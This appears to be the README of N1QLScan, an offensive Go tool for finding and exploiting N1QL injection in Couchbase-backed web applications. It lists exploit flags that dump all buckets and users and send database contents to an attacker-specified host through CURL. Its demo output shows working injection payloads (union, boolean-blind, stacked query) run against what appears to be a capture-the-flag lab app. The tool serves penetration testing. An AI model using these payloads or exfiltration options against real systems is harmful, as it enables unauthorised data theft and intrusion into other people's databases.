# N1QLScan

##  Introduction

> A fast and simple N1QL injection tool written in Go

**N1QLScan** automates the detection and exploitation of N1QL injection vulnerabilities. Designed to be reliable and easy to use for security professionals and penetration testers.

## 📋 Features

- Detect N1QL injection vulnerabilities in web applications and APIs
- Perform data extraction
- Perform SSRF/data exfiltration attacks via CURL
- Detect a user's role and permissions

## 💾 Installation

```bash
go install github.com/felsec/n1qlscan@latest
```

#### Alternative Installation

Download the pre-compiled binaries from the [Releases page](https://github.com/FelSec/n1qlscan/releases).

## ⚙️ Usage

### Scanning

```text

███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

Scan the target for N1QL injection vulnerabilities.

Examples:
  Scan URL
  n1qlscan scan -u https://vulnerableapp.com/vulnpage?param=1

  Scan using request file
  n1qlscan scan -r ./vulnerable-request.txt

  Scan a parameter
  n1qlscan scan -u https://vulnerableapp.com/vulnpage?param=1&id=2&search=test -p search

  Scan multiple parameters
  n1qlscan scan -u https://vulnerableapp.com/vulnpage?param=1&id=2&search=test -p search,id

Usage:
  n1qlscan scan {--url URL | --request FILE} [flags]

Flags:
  -u, --url https://vulnerableapp.com/vulnpage?param=1   Target URL to scan (e.g. https://vulnerableapp.com/vulnpage?param=1)
  -r, --request string                                   Load a request from a file for scanning
  -p, --parameter param1,param2                          Parameter(s) to test - e.g. -p param1,param2
      --exclude-parameter param3,param4                  Parameter(s) to exclude from testing - e.g. --exclude-parameter param3,param4
      --ignore-path                                      Don't scan the URL path
  -h, --help                                             help for scan

Global Flags:
  -C, --cookie <cookie name>=<cookie value>   Add a cookie to the request, in the format <cookie name>=<cookie value> - e.g. session=ThisIsACookie
      --force-ssl                             Force the use of SSL/HTTPS
  -H, --header <header>:<value>               Add a custom header to the request, in the format <header>:<value> - e.g. X-Custom-Header:ThisIsACustomHeader
  -k, --insecure                              Disable TLS certificate validation
      --no-state                              No-State
      --proxy http://<proxy>:<port>           Use a proxy to connect to the target http://<proxy>:<port> - e.g. http://127.0.0.1:8080
      --skip-check                            Skip checking connection to the target
  -v, --verbose                               Verbose
```

### Exploiting

```text

███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

Run N1QL injection attacks against the target application.

Examples:
  URL
  n1qlscan exploit -u https://vulnerableapp.com/vulnpage?param=1 --get-cbversion

  Request File
  n1qlscan exploit -r ./vulnerable-request.txt --dump-all-buckets

Flags:
Target:
  -u, --url https://vulnerableapp.com/vulnpage?param=1   Target URL (e.g. https://vulnerableapp.com/vulnpage?param=1)
  -r, --request string                                   Load a request from a file

System Information:
      --get-version        Dump the N1QL version information.
      --get-cbversion      Dump the Couchbase Server version information.
      --get-buckets        Dump the list of buckets.
      --get-keyspaces      Dump the list of non-system keyspaces.
      --get-current-user   Dump the current user.
      --get-roles          Dump the current user's role information.
      --is-admin           Checks if the current user is an admin.
      --get-prepared       Dump the list of prepared statements.
      --get-functions      Dump the list of user-defined functions.
      --get-nodes          Dump the list of nodes.

Data Dump:
      --dump-all-buckets     Dump all the data from all buckets.
      --dump-bucket BUCKET   Dump the data from the specified bucket. (e.g. BUCKET)
      --dump-users           Dump all users.
      --dump-user USER       Dump specified user. (e.g. USER)

Optimisations:
      --threads int   Max number of concurrent task (default 8)

CURL Options:
      --can-curl                   Checks if the current user can use the CURL function
      --is-unrestricted            Check if the CURL is configured in unrestricted mode
      --exfil-version              Exfiltrate the N1QL version information to the target host
      --exfil-cbversion            Exfiltrate the Couchbase Server version information to the target host
      --exfil-bucketlist           Exfiltrate the list of buckets to the target host
      --exfil-keyspaces            Exfiltrate the list of non-system keyspaces to the target host
      --exfil-user                 Exfiltrate the current user information to the target host
      --exfil-roles                Exfiltrate the current user's role information to the target host
      --exfil-prepared             Exfiltrate the list of prepared statements to the target host
      --exfil-functions            Exfiltrate the list of user-defined functions to the target host
      --exfil-nodes                Exfiltrate the list of nodes to the target host
      --exfil-bucket-data string   Exfiltrate all the data from the specified bucket.
      --exfil-all-bucket-data      Exfiltrate all the data from all the buckets.
      --exfil-user-data string     Exfiltrate the data for the specified user.
      --exfil-all-user-data        Exfiltrate the data for all users.
      --exfil-host string          Target exfiltration host. Format: http(s)://<host>:<port>/<endpoint>

Global Flags:
  -C, --cookie <cookie name>=<cookie value>   Add a cookie to the request, in the format <cookie name>=<cookie value> - e.g. session=ThisIsACookie
      --force-ssl                             Force the use of SSL/HTTPS
  -H, --header <header>:<value>               Add a custom header to the request, in the format <header>:<value> - e.g. X-Custom-Header:ThisIsACustomHeader
  -k, --insecure                              Disable TLS certificate validation
      --no-state                              No-State
      --proxy http://<proxy>:<port>           Use a proxy to connect to the target http://<proxy>:<port> - e.g. http://127.0.0.1:8080
      --skip-check                            Skip checking connection to the target
  -v, --verbose                               Verbose
```

### Manual Exploitation

```

███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

Run a custom N1QL injection attack against the target application.

Examples:
  URL
  n1qlscan manual -u https://vulnerableapp.com/vulnpage?param=1 -p param -P "'OR'a'='a"

  Request File
  n1qlscan manual -r ./vulnerable-request.txt -p param -P "'OR'a'='a"

Usage:
  n1qlscan manual {--url URL | --request FILE} --payload PAYLOAD --parameter PARAMETER [flags]

Flags:
  -u, --url https://vulnerableapp.com/vulnpage?param=1   Target URL (e.g. https://vulnerableapp.com/vulnpage?param=1)
  -r, --request string                                   Load a request from a file
  -p, --parameter string                                 Parameter to inject into
  -P, --payload string                                   Payload to send
      --no-urlencode                                     Prevent URL encoding of payload (You will need to encode it yourself)
  -h, --help                                             help for manual

Global Flags:
  -C, --cookie <cookie name>=<cookie value>   Add a cookie to the request, in the format <cookie name>=<cookie value> - e.g. session=ThisIsACookie
      --force-ssl                             Force the use of SSL/HTTPS
  -H, --header <header>:<value>               Add a custom header to the request, in the format <header>:<value> - e.g. X-Custom-Header:ThisIsACustomHeader
  -k, --insecure                              Disable TLS certificate validation
      --no-state                              No-State
      --proxy http://<proxy>:<port>           Use a proxy to connect to the target http://<proxy>:<port> - e.g. http://127.0.0.1:8080
      --skip-check                            Skip checking connection to the target
  -v, --verbose                               Verbose
```

## 💻 Demo

### Scanning

```text
> n1qlscan scan -u 'http://vulnerableapp.local:45000/blog?id=p1&debug=y'

███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

Scan start: 10/02/2026 19:25:54
[19:25:54] [INFO] Checking connection to target application
[19:25:55] [INFO] Application accessible. Response returned: 200 OK
[19:25:55] [INFO] Testing Get parameter debug
[19:25:55] [INFO] Testing Get parameter id
[19:25:56] [INFO] Performing Boolean-based AND checks
[19:25:57] [INFO] Performing Boolean-based OR checks
[19:25:57] [INFO] Performing Union checks
[19:26:00] [INFO] Performing Stacked Query checks
[19:26:01] [INFO] Performing String Concatenation checks
[19:26:01] [INFO] Performing Error-based checks
[19:26:02] [INFO] Testing path segment blog

+============================================================+

Query parameter id is vulnerable to Boolean-based Blind N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1'
Exploit Type: Boolean-based Blind
Example Payload: p1'and'S2LYgiU1'='S2LYgiU1
Payload Template: p1'and<payload>=<check>

+============================================================+

Query parameter id is vulnerable to Boolean-based Blind N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1')--
Exploit Type: Boolean-based Blind
Example Payload: p1'and'T7nu4Jh9'='T7nu4Jh9')--
Payload Template: p1'and<payload>=<check>)--

+============================================================+

Query parameter id is vulnerable to Boolean-based Blind N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1'
Exploit Type: Boolean-based Blind
Example Payload: 2a367nFI'or'cxpHlyRV'='cxpHlyRV
Payload Template: 2a367nFI'or<payload>=<check>

+============================================================+

Query parameter id is vulnerable to Boolean-based Blind N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1')--
Exploit Type: Boolean-based Blind
Example Payload: o1411kjy'or'SFJx14XA'='SFJx14XA')--
Payload Template: o1411kjy'or<payload>=<check>)--

+============================================================+

Query parameter id is vulnerable to Union-based N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1'
Exploit Type: Union-based
Example Payload: p1'union select'N1QLSCAN
Payload Template: p1'union <payload>

+============================================================+

Query parameter id is vulnerable to Union-based N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1')
Exploit Type: Union-based
Example Payload: p1')union(select'N1QLSCAN
Payload Template: p1')union(<payload>

+============================================================+

Query parameter id is vulnerable to Union-based N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1')--
Exploit Type: Union-based
Example Payload: p1'union select'N1QLSCAN'as nickel28)--
Payload Template: p1'union <payload>)--

+============================================================+

Query parameter id is vulnerable to Stacked Query N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1')
Exploit Type: Stacked Query
Example Payload: p1'),(select raw'N1QLSCAN
Payload Template: p1'),(<payload>

+============================================================+

Query parameter id is vulnerable to Stacked Query N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1')--
Exploit Type: Stacked Query
Example Payload: p1'),(select raw'N1QLSCAN')--
Payload Template: p1'),(<payload>')--

+============================================================+

Query parameter id is vulnerable to String Concatenation N1QL injection
Location: Query parameter
Parameter: id
Detection Method: p1'
Exploit Type: String Concatenation
Example Payload: p1'||CASE WHEN'N1QLSCAN'='N1QLSCAN' THEN '' ELSE 'O7pst3v3' END||'
Payload Template: p1'||<payload>||'

+============================================================+
```

### Exploiting

```text
n1qlscan exploit -u http://vulnerableapp.local:45000/blog?id=p1&debug=y --get-current-user

███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

Automated exploit start: 10/02/2026 19:43:57
[19:43:57] [INFO] Checking connection to target application
[19:43:57] [INFO] Application accessible. Response returned: 200 OK
✔ 5 - id - Union-based - p1'union select'N1QLSCAN
[19:44:02] [INFO] Current User: [{"id":"fletcher_one"}]
```

### Manual Exploitation

```text
n1qlscan manual -u 'http://vulnerableapp.local:45000/blog?id=p1&debug=y' -p id -P "' UNION SELECT raw {\"t
itle\":\"N1QLSCAN\",\"content\":\"injected-\"||CURRENT_USERS()[0],\"id\":DS_VERSION()} )--"

███╗   ██╗ ██╗ ██████╗ ██╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
████╗  ██║███║██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗████╗  ██║
██╔██╗ ██║╚██║██║   ██║██║     ███████╗██║     ███████║██╔██╗ ██║
██║╚██╗██║ ██║██║▄▄ ██║██║     ╚════██║██║     ██╔══██║██║╚██╗██║
██║ ╚████║ ██║╚██████╔╝███████╗███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═══╝ ╚═╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

Manual exploit start: 10/02/2026 20:00:27
[20:00:27] [INFO] Checking connection to target application
[20:00:27] [INFO] Application accessible. Response returned: 200 OK
[20:00:28] [INFO] Response:
HTTP/1.1 200 OK
Connection: close
Content-Length: 2517
Content-Type: text/html; charset=utf-8
Date: Tue, 10 Feb 2026 20:00:28 GMT
Server: Werkzeug/3.1.3 Python/3.11.8

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Blog -  - Coffee Bean Networks</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css"
    />
    <link rel="stylesheet" href="/static/css/custom.css">
    <link rel="icon" type="image/x-icon" href="/static/favicon.ico">
  </head>
  <body>
    <header class="row">
      <div class="twelve columns">
        <h2 class="four columns">Coffee Bean Networks</h2>
        <ul class="eight columns">
          <li class="two columns"><a href="/">Home</a></li>
          <li class="two columns"><a href="/about">About</a></li>
          <li class="two columns"><a href="/contact">Contact</a></li>
          <li class="two columns"><a href="/blog">Blog</a></li>
        </ul>
      </div>
    </header>
    <main>

<!-- Use the debug parameter to to check the data ~ Graham -->

<div class="row">
    <div class="twelve columns">
<div class="box">
    <h2>Debug:</h2>
    <pre>
        <code>
Input: select (select content,id,title from blog_posts where id=&#39;p1&#39; UNION SELECT raw {&#34;title&#34;:&#34;N1QLSCAN&#34;,&#34;content&#34;:&#34;injected-&#34;||CURRENT_USERS()[0],&#34;id&#34;:DS_VERSION()} )--&#39;)
Output: [
    {
        &#34;$1&#34;: [
            {
                &#34;content&#34;: &#34;injected-local:fletcher_one&#34;,
                &#34;id&#34;: &#34;7.6.6-6126-enterprise&#34;,
                &#34;title&#34;: &#34;N1QLSCAN&#34;
            },
            {
                &#34;content&#34;: &#34;Coffee is known to boost energy levels and improve mental alertness.&#34;,
                &#34;id&#34;: &#34;p1&#34;,
                &#34;title&#34;: &#34;Coffee Benefits&#34;
            }
        ]
    }
]
        </code>
    </pre>
</div>
</div>
</div>

    <div class="twelve columns">
<section>
    <h2>N1QLSCAN</h2>
    <p>injected-local:fletcher_one</p>
</section>
</div>
</main>
    <footer>
      <p>&copy; 2024 Coffee Bean Networks. All rights reserved.</p>
      <a href="/status">Check App Status?</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/flags">Submit Your Flags Here!</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="ping" href="/api/en/ping"></a>
    </footer>
    <script>
      setTimeout(() => {
      fetch('/api/en/ping').then(r => r.json()).then(d => document.body.querySelector('#ping').textContent = d.response)
      },10000);
    </script>
  </body>
</html>
```

## 🔗 Links / Acknowledgements

[![FelSec Blog](https://img.shields.io/badge/Blog-FelSec-purple)](https://felsec.com/)&nbsp;&nbsp;&nbsp;&nbsp;[![bluesky](https://img.shields.io/badge/bluesky-felsec-purple?logo=bluesky)](https://bsky.app/profile/felsec.bsky.social)&nbsp;&nbsp;&nbsp;&nbsp;[![x](https://img.shields.io/badge/X-felsec-blue)](https://x.com/felsec)

This tool is heavily inspired by the sqlmap and N1QLMap tools. Links to the respective projcets below.

- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [N1QLMap](https://github.com/FSecureLABS/N1QLMap)

